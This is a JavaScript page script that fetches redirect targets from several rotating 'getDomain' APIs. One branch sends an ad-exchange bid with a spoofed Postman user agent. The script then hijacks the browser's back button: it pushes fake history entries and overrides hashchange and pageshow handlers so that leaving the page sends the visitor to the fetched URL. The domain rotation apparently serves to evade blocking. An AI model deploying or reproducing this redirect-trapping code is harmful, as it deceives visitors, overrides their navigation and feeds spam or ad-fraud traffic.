window.onpageshow = function (){
	sessionStorage.getItem("jumpOut") && a();
};

var apiArr = [
	"https://ai8.top/api/getWeUrl?tid=1",
	"https://api.jianyuekeji.cn/api/getDomain/3286_7bwv1yukxsbx19yg",
	"https://api.jianyuekeji.cn/api/getDomain/5133_jdvue9vejevmeusg",
	"https://api.jianyuekeji.cn/api/getDomain/5134_4kwyn83uebbffavk",
	"https://adx.tuia.cn/bid/tuia",
	"https://ai8.top/api/getWeUrl?tid=2",
	"https://ai8.top/api/getWeUrl?tid=3",
	"https://ai8.top/api/getWeUrl?tid=4",
	"https://api.hbty002.cn/task/getDomain?hh=wjy01&cs=2&pp=1",
	"https://api.hbty002.cn/task/getDomain?hh=wjy08&cs=2&pp=1",
	"https://api.hbty002.cn/task/getDomain?hh=zz94&cs=2&pp=1",
	"https://api.jianyuekeji.cn/api/getDomain/5263_ace3600g2mx0kxnb",
	"https://api.jianyuekeji.cn/api/getDomain/6073_xxyt2f1ekvn509m9",
	"http://get.wckj001.cn/task/getDomain?hh=zz100&cs=2&pp=1",//13 liumao
	"https://api.hbty002.cn/task/getDomain?hh=ray18&cs=2&pp=1",//14
	"https://api.jianyuekeji.cn/api/getDomain/6085_a44w19u0xvwdb0mw",
];

var timeid = new Date().getTime().toString().substr(-5);
var durl = "";//"http://wan55.cn/wan14#" + timeid;
var href = location.href;
var apiUrl = "";

if(href.indexOf("wan55" ) > -1){
    apiUrl = apiArr[2];
}else if(href.indexOf("3601ab" ) > -1){
    apiUrl = apiArr[1];
}else if(href.indexOf("acc1ct" ) > -1){
    apiUrl = apiArr[2];
}else if(href.indexOf("20215k" ) > -1){
    apiUrl = apiArr[2];
}else{
    //apiUrl = apiArr[4];
    durl = "http://360ta.cn/new13#" + timeid;
    /*
    var rand_n = Math.floor(Math.random() * 100);
    if(rand_n <= 50){
        durl = "http://accct.cn/new22#" + timeid;
    }else{
        
    }
    */
}
/*
var rand_n = Math.floor(Math.random() * 100);
if(rand_n <= 50){
    apiUrl = apiArr[4];
}
*/

if (apiUrl == apiArr[4]){
	var dataArr ={
		device:{ ua: "PostmanRuntime/7.28.4" },
		id: "c5c56777b2cd4c5482d664a3bfddbf",
		imp: [
			{
				banner:{ h: 0, mimes: ["jpg", "jpeg", "png", "gif"], w: 0 },
				bidfloor: 0,
				id: "534654e3db",
				pid: "470680",
				type: 1,
			},
		],
		secure: 1,
	};

    var xhr = new XMLHttpRequest();
    xhr.open('POST', apiArr[4], true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var data = JSON.parse(xhr.responseText.trim());
            durl = data.seatbid[0].bid[0].durl;
			console.log("durk",durl);
			/*
			window.fetch(apiArr[5]).then(function (res){
			    return res.json();
			}).then(function (data){});
			*/
        }
    };
    xhr.send(JSON.stringify(dataArr));
}else{
	if(!durl){
		window.fetch(apiUrl).then(function (res){
			return res.json();
		}).then(function (data){
			durl = data.url ? data.url : data.data.url;
			
			/*
			window.fetch(apiArr[7]).then(function (res){
				return res.json();
			}).then(function (data){});
			*/
			
		});
	}
}

function a(){
	if (durl){
		location.href = durl;
	}
	
	/*
    if(durl.indexOf("appKey") > -1){
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?5b23634820a9d1c87b1be867312a522d";
          var s = document.getElementsByTagName("script")[0]; 
          s.parentNode.insertBefore(hm, s);
        })();
    }
    */
}

function ntzgo(){
	history.pushState(history.length + 1, "message", window.location.href.split("#")[0] + "#" + new Date().getTime(), );
	if (navigator.userAgent.indexOf("Android") != -1){
		if (typeof tbsJs != "undefined"){
			tbsJs.onReady("{useCachedApi : 'true'}",
			function(e){});
			window.onhashchange = function(){
				window.history.pushState("forward", null, "#");
				window.history.forward(1);
				if (durl){
            		location.href = durl;
            	}
			}
		}else{
			var pop = 0;
			window.onhashchange = function(event){
				pop++;
				if (pop >= 3){
					if (durl){
                		location.href = durl;
                	}
				}else{
					history.go(1);
				}
			};
			history.go(-1);
		}
	}else{
		window.onhashchange = function(){
			if (durl){
        		location.href = durl;
        	}
		}
	}
}